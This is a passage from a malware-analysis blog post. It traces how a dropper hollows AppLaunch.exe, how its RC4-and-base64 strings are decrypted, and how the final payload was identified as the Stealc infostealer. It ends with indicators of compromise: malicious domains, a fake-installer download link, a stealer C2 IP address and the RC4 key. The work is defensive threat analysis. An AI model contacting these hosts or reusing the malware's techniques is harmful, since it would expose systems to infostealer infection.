<p>Finally, I hit a breakpoint on <code>NtResumeThread</code> which will take the <code>AppLaunch.exe</code> process out of the suspended state, and in doing so, execute the unpacked PE.</p>
<p>Note: Technically speaking, what has occurred is categorized as process hollowing, rather than injection, so my guess was close, but not quite accurate.</p>
<p>Now that I have reached the end of the unpacking stage, I can dump the unpacked payload from the memory of the hollowed process.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/end_of_hollowing.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/end_of_hollowing.png"
            alt="end_of_hollowing"
            />
    </a>
    
</figure>
Since the payload was mapped into memory, before I can analyze it I had to use PEBear to adjust the section table.<br>
With this done, I can move on to the next stage!</p>
<h2 id="final-payload-stealc">Final Payload: Stealc</h2>
<p>While performing initial observations in DetectItEasy, I noticed a large number of what looked like base64 encoded strings inside the payload. When decoded, they contained unintelligible data - likely encrypted somehow.</p>
<h3 id="string-decryption">String Decryption</h3>
<p>After running the binary in x32dbg, I observed the first function looked like it was performing string decryption.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/string_decryption.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/string_decryption.png"
            alt="string_decryption"
            />
    </a>
    
</figure>
On a guess, I tried using Cyberchef with one of the base64 encoded strings and the above highlighted 20 digit string as an RC4 key - got it! The binary uses a combination of base64 and RC4 to hide the contents of the strings.
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/rdata.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/rdata.png"
            alt="rdata"
            />
    </a>
    
</figure>
For fun, I decided to make a Python string decryption script, since the RC4 key and the base64 string are just sitting in the <code>.rdata</code> section. The script can be found <a href="https://gist.github.com/rerednawyerg/6b6ff1ee6ed701f656e235a6d9cd460f">here, on my Github</a>.</p>
<p>Running the script, I extracted all the decrypted strings and added them to <a href="https://pastebin.com/">Pastebin</a>.</p>
<h3 id="identification">Identification</h3>
<p>Now it&rsquo;s time to try and identify the sample. Googling one of the strings (<code>&quot;Country: ISO?&quot;</code>) found in the <code>AppLaunch.exe</code>'s memory, I came across a fantastic blog post from <a href="https://blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/">Sekoia.io</a>, describing a newly observed info-stealer called &ldquo;Stealc&rdquo;.</p>
<p>The technical analysis portion of the blog lines up exactly with the activity I have seen in this sample, so I can safely conclude the malware is in fact, the &ldquo;Stealc&rdquo; information stealer.</p>
<p>Since the blog goes into such great detail, I&rsquo;ll stop my analysis here, but would recommending giving both Part 1 and Part 2 of the Sekoia blog a read.</p>
<h2 id="final-words">Final Words</h2>
<p>Google malvertising seems to have made a brief resurgence, but in the time it took me to complete this writeup, the levels I have been able to detect have decreased to almost nothing. Hopefully this indicates Google is cracking down on bad actors abusing the system.</p>
<p>As always, please feel free to send me feedback regarding anything in this writeup - I&rsquo;m always looking to improve and learn more. My contact details can be found on the home page.</p>
<h3 id="iocs">IOCs</h3>
<h5 id="_initial-stage_"><em>Initial Stage</em></h5>
<ul>
<li>givingspirit[.]us</li>
<li>advanced-ip-scanner[.]net</li>
<li>cdn-c08e638.azureedge[.]net/download.html?q=ipscanner</li>
<li>www.dropbox[.]com/s/8b79t04dohaf82t/Advanced_IP_Scanner_2.5.4594.1.exe?dl=1</li>
</ul>
<h5 id="_dropper_"><em>Dropper</em></h5>
<ul>
<li>snow.cdn-b1d8e9.workers[.]dev</li>
<li>api-cdn12.azureedge[.]net</li>
</ul>
<h5 id="_stealer_"><em>Stealer</em></h5>
<ul>
<li>31.41.244.65</li>
</ul>
<h5 id="rc4-key">RC4 Key</h5>
<ul>
<li>83592471861675582409</li>
</ul>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
      
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2023-04-19 10:15
        

         
          
        
      </p>
    </div>
      <hr />
   
        













  

  

  

  

  








  


 






<style>
.resp-sharing-button__link,
.resp-sharing-button__icon {
  display: inline-block
}

.resp-sharing-button__link {
  text-decoration: none;
  color: #fff !important;
  margin: 0.5em
}

.resp-sharing-button {
  border-radius: 5px;
  transition: 25ms ease-out;
  padding: 0.5em 0.75em;
  font-family: Helvetica Neue,Helvetica,Arial,sans-serif;
  
}

.resp-sharing-button__icon svg {
  width: 1em;
  height: 1em;
  margin-right: 0.4em;
  vertical-align: middle
}

.resp-sharing-button--small svg {
  margin: 0;
  vertical-align: middle
}

 
.resp-sharing-button__icon {
  stroke: #fff;
  fill: none
}

 
.resp-sharing-button__icon--solid,
.resp-sharing-button__icon--solidcircle {
  fill: #fff;
  stroke: none
}

.resp-sharing-button--twitter {
  background-color: #55acee
}

.resp-sharing-button--twitter:hover {
  background-color: #2795e9
}

.resp-sharing-button--pinterest {
  background-color: #bd081c
}

.resp-sharing-button--pinterest:hover {
  background-color: #8c0615
}

.resp-sharing-button--facebook {
  background-color: #3b5998
}

.resp-sharing-button--facebook:hover {
  background-color: #2d4373
}

.resp-sharing-button--tumblr {
  background-color: #35465C
}

.resp-sharing-button--tumblr:hover {
  background-color: #222d3c
}

.resp-sharing-button--reddit {
  background-color: #ff4500
}

.resp-sharing-button--reddit:hover {
  background-color: #3a80c1
}

.resp-sharing-button--google {
  background-color: #dd4b39
}

.resp-sharing-button--google:hover {
  background-color: #c23321
}

.resp-sharing-button--linkedin {
  background-color: #0077b5
}

.resp-sharing-button--linkedin:hover {
  background-color: #046293
}

.resp-sharing-button--email {
  background-color: #777
}

.resp-sharing-button--email:hover {
  background-color: #5e5e5e
}

.resp-sharing-button--xing {
  background-color: #1a7576
}

.resp-sharing-button--xing:hover {
  background-color: #114c4c
}

.resp-sharing-button--whatsapp {
  background-color: #25D366
}

.resp-sharing-button--whatsapp:hover {
  background-color: #1da851
}

.resp-sharing-button--hackernews {
background-color: #FF6600
}
.resp-sharing-button--hackernews:hover, .resp-sharing-button--hackernews:focus {   background-color: #FB6200 }

.resp-sharing-button--vk {
  background-color: #507299
}

.resp-sharing-button--vk:hover {
  background-color: #43648c
}

.resp-sharing-button--facebook {
  background-color: #3b5998;
  border-color: #3b5998;
}

.resp-sharing-button--facebook:hover,
.resp-sharing-button--facebook:active {
  background-color: #2d4373;
  border-color: #2d4373;
}

.resp-sharing-button--twitter {
  background-color: #55acee;
  border-color: #55acee;
}

.resp-sharing-button--twitter:hover,
.resp-sharing-button--twitter:active {
  background-color: #2795e9;
  border-color: #2795e9;
}

.resp-sharing-button--tumblr {
  background-color: #35465C;
  border-color: #35465C;
}

.resp-sharing-button--tumblr:hover,
.resp-sharing-button--tumblr:active {
  background-color: #222d3c;
  border-color: #222d3c;
}

.resp-sharing-button--email {
  background-color: #777777;
  border-color: #777777;
}

.resp-sharing-button--email:hover,
.resp-sharing-button--email:active {
  background-color: #5e5e5e;
  border-color: #5e5e5e;
}

.resp-sharing-button--pinterest {
  background-color: #bd081c;
  border-color: #bd081c;
}

.resp-sharing-button--pinterest:hover,
.resp-sharing-button--pinterest:active {
  background-color: #8c0615;
  border-color: #8c0615;
}

.resp-sharing-button--linkedin {
  background-color: #0077b5;
  border-color: #0077b5;
}

.resp-sharing-button--linkedin:hover,
.resp-sharing-button--linkedin:active {
  background-color: #046293;
  border-color: #046293;
}

.resp-sharing-button--reddit {
  background-color: #ff4500;
  border-color: #ff4500;
}

.resp-sharing-button--reddit:hover,
.resp-sharing-button--reddit:active {
  background-color: #ff5700;
  border-color: #ff5700;
}

.resp-sharing-button--xing {
  background-color: #1a7576;
  border-color: #1a7576;
}

.resp-sharing-button--xing:hover
.resp-sharing-button--xing:active {
  background-color: #114C4C;
  border-color: #114C4C;
}

.resp-sharing-button--whatsapp {
  background-color: #25D366;
  border-color: #25D366;
}

.resp-sharing-button--whatsapp:hover,
.resp-sharing-button--whatsapp:active {
  background-color: #1DA851;
  border-color: #1DA851;
}

.resp-sharing-button--hackernews {
  background-color: #FF6600;
  border-color: #FF6600;
}

.resp-sharing-button--hackernews:hover
.resp-sharing-button--hackernews:active {
  background-color: #FB6200;
  border-color: #FB6200;
}

.resp-sharing-button--vk {
  background-color: #507299;
  border-color: #507299;
}

.resp-sharing-button--vk:hover
.resp-sharing-button--vk:active {
  background-color: #43648c;
  border-color: #43648c;
}

.resp-sharing-button--telegram {
  background-color: #54A9EB;
}

.resp-sharing-button--telegram:hover {
  background-color: #4B97D1;
}
</style>




<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/" target="_blank" rel="noopener" aria-label="" title="Facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/></svg>


    </div>
  </div>
</a>




<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=Unraveling%20a%20Stealc%20Dropper&amp;url=https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/" target="_blank" rel="noopener" aria-label="" title="Twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z"/></svg>

    
    </div>
  </div>
</a>










<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/&amp;title=Unraveling%20a%20Stealc%20Dropper&amp;summary=Unraveling%20a%20Stealc%20Dropper&amp;https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/" target="_blank" rel="noopener" aria-label="">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 21.5h-5v-13h5v13zM4 6.5C2.5 6.5 1.5 5.3 1.5 4s1-2.4 2.5-2.4c1.6 0 2.5 1 2.6 2.5 0 1.4-1 2.5-2.6 2.5zm11.5 6c-1 0-2 1-2 2v7h-5v-13h5V10s1.6-1.5 4-1.5c3 0 5 2.2 5 6.3v6.7h-5v-7c0-1-1-2-2-2z"/></svg>

    
    </div>
  </div>
</a>




<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/&amp;resubmit=true&amp;title=Unraveling%20a%20Stealc%20Dropper" target="_blank" rel="noopener" aria-label="" title="Reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M24 11.5c0-1.65-1.35-3-3-3-.96 0-1.86.48-2.42 1.24-1.64-1-3.75-1.64-6.07-1.72.08-1.1.4-3.05 1.52-3.7.72-.4 1.73-.24 3 .5C17.2 6.3 18.46 7.5 20 7.5c1.65 0 3-1.35 3-3s-1.35-3-3-3c-1.38 0-2.54.94-2.88 2.22-1.43-.72-2.64-.8-3.6-.25-1.64.94-1.95 3.47-2 4.55-2.33.08-4.45.7-6.1 1.72C4.86 8.98 3.96 8.5 3 8.5c-1.65 0-3 1.35-3 3 0 1.32.84 2.44 2.05 2.84-.03.22-.05.44-.05.66 0 3.86 4.5 7 10 7s10-3.14 10-7c0-.22-.02-.44-.05-.66 1.2-.4 2.05-1.54 2.05-2.84zM2.3 13.37C1.5 13.07 1 12.35 1 11.5c0-1.1.9-2 2-2 .64 0 1.22.32 1.6.82-1.1.85-1.92 1.9-2.3 3.05zm3.7.13c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2zm9.8 4.8c-1.08.63-2.42.96-3.8.96-1.4 0-2.74-.34-3.8-.95-.24-.13-.32-.44-.2-.68.15-.24.46-.32.7-.18 1.83 1.06 4.76 1.06 6.6 0 .23-.13.53-.05.67.2.14.23.06.54-.18.67zm.2-2.8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm5.7-2.13c-.38-1.16-1.2-2.2-2.3-3.05.38-.5.97-.82 1.6-.82 1.1 0 2 .9 2 2 0 .84-.53 1.57-1.3 1.87z"/></svg>

    
    </div>
  </div>
</a>








<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https://rerednawyerg.github.io/posts/malwareanalysis/stealc_ipscanner/&amp;t=Unraveling%20a%20Stealc%20Dropper" target="_blank" rel="noopener" aria-label="">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 140"><path fill-rule="evenodd" d="M60.94 82.314L17 0h20.08l25.85 52.093c.397.927.86 1.888 1.39 2.883.53.994.995 2.02 1.393 3.08.265.4.463.764.596 1.095.13.334.262.63.395.898.662 1.325 1.26 2.618 1.79 3.877.53 1.26.993 2.42 1.39 3.48 1.06-2.254 2.22-4.673 3.48-7.258 1.26-2.585 2.552-5.27 3.877-8.052L103.49 0h18.69L77.84 83.308v53.087h-16.9v-54.08z"></path></svg>

      
    </div>
  </div>
</a>









    
    <div class="pagination">
        
        <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
        </div>
        

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://rerednawyerg.github.io/posts/malwareanalysis/raccoon_stealer_youtube/">
                    <span class="button__text">Raccoons Nesting In .NET</span>
                    <span class="button__icon">â†’</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.97a8045a726eccf303b74163251eb214dcb8fce3e0eaddb67866dc97cd45bb5954e4edd26e063cf1b285743e3331ab3a31a0ba5703b1fced4a406fc7b7205eb3.js" integrity="sha512-l6gEWnJuzPMDt0FjJR6yFNy4/OPg6t22eGbcl81Fu1lU5O3SbgY88bKFdD4zMas6MaC6VwOx/O1KQG/HtyBesw=="></script>



    </body>
</html>
